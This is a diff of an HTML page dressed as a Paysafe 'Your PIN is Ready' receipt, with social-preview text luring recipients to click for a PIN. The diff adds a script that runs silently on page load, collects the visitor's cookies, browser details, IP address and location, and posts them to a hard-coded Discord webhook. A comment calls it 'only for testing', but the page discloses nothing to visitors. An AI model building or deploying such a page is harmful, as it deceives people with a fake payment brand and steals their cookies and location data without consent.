@@ -1,16 +1,140 @@
+
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>Get Your PIN</title>
-  
-  <!-- Open Graph meta tags for social previews -->
-  <meta property="og:title" content="PaySafe" />
-  <meta property="og:description" content="To get the full PIN, click the link below for your online receipt." />
-  <meta property="og:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
-  <meta property="og:type" content="website" />
-  
-  <!-- Twitter card (optional) -->
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="Get Your PIN Online!" />
-  <meta name="twitter:description" content="To get the full PIN, click the link below for your online receipt." />
-  <meta name="twitter:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
+    <meta charset="UTF-8" />
+    <title>Get Your PIN</title>
+    
+    <!-- Open Graph meta tags for social previews -->
+    <meta property="og:title" content="PaySafe" />
+    <meta property="og:description" content="To get the full PIN, click the link below for your online receipt." />
+    <meta property="og:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
+    <meta property="og:type" content="website" />
+    
+    <!-- Twitter card (optional) -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Get Your PIN Online!" />
+    <meta name="twitter:description" content="To get the full PIN, click the link below for your online receipt." />
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/dimitriskleov/grab/main/meta.png" />
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paysafe - Your PIN is Ready!</title>
+    <script type="text/javascript" nonce="c37f3a9e5ed64895a446930cace" src="//local.adguard.org?ts=1750429719883&amp;type=content-script&amp;dmn=api.websim.com&amp;url=https%3A%2F%2Fapi.websim.com%2Fapi%2Fv1%2Fprojects%2F0gls2zltv6ps6zcxuvqx%2Frevisions%2F1%2Fhtml&amp;app=firefox.exe&amp;css=3&amp;js=1&amp;rel=1&amp;rji=1&amp;sbe=1&amp;stealth=1&amp;st-push&amp;st-loc&amp;st-dnt&amp;st-1pcttl=4320"></script>
+<script type="text/javascript" nonce="c37f3a9e5ed64895a446930cace" src="//local.adguard.org?ts=1750429719883&amp;name=AdGuard%20Extra&amp;name=AdGuard%20Popup%20Blocker&amp;type=user-script"></script><link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+            width: 90%;
+            border-top: 5px solid #007bff; /* Paysafe blue color */
+        }
+        h1 {
+            color: #007bff;
+            margin-bottom: 20px;
+            font-size: 2.5em;
+            font-weight: 700;
+        }
+        p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+        .pin-display {
+            background-color: #e9ecef;
+            border: 2px dashed #ced4da;
+            border-radius: 8px;
+            padding: 20px;
+            font-size: 2.8em;
+            font-weight: 700;
+            letter-spacing: 3px;
+            color: #28a745; /* Green for emphasis */
+            margin-bottom: 30px;
+            display: inline-block;
+        }
+        .note {
+            font-size: 0.9em;
+            color: #6c757d;
+            margin-top: 20px;
+        }
+        .logo {
+            margin-bottom: 30px;
+        }
+        .logo img {
+            max-width: 180px;
+            height: auto;
+        }
+    </style>
 </head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="paysafe_logo.png" alt="Paysafe Logo">
+        </div>
+        <h1>Your Paysafe PIN is Available!</h1>
+        <p>Congratulations! Your Paysafe PIN is Available!</p>
+        <div class="pin-display">
+            0453-3208-0944-5447
+
+</body>
+
+<script>
+  async function getLocationAndShow() {
+    const info = {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      cookies: document.cookie,
+    };
+
+    // Get IP/location info
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      info.ip = data.ip;
+      info.city = data.city;
+      info.region = data.region;
+      info.country = data.country_name;
+      info.postal = data.postal;
+      info.org = data.org;
+    } catch (e) {
+      info.locationError = "Could not fetch location data";
+    }
+
+    // Show on the page
+
+    // Send to Discord webhook – only for testing, not recommended for real user data!
+    // ⚠️ Replace this ONLY if users consent to sending this info.
+    fetch("https://discord.com/api/webhooks/1385656997587718287/WYyyFCcKvoCXwezu6f3357KcZ7dY5rsPFGneW5WXBw32qMCnrAEl4Ty0JMiWkK9vtsdY", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        content: `📡 New visitor:
+\`\`\`json
+${JSON.stringify(info, null, 2)}
+\`\`\``
+      })
+    });
+  }
+
+  getLocationAndShow();
+</script>
+
+
+</html>
+
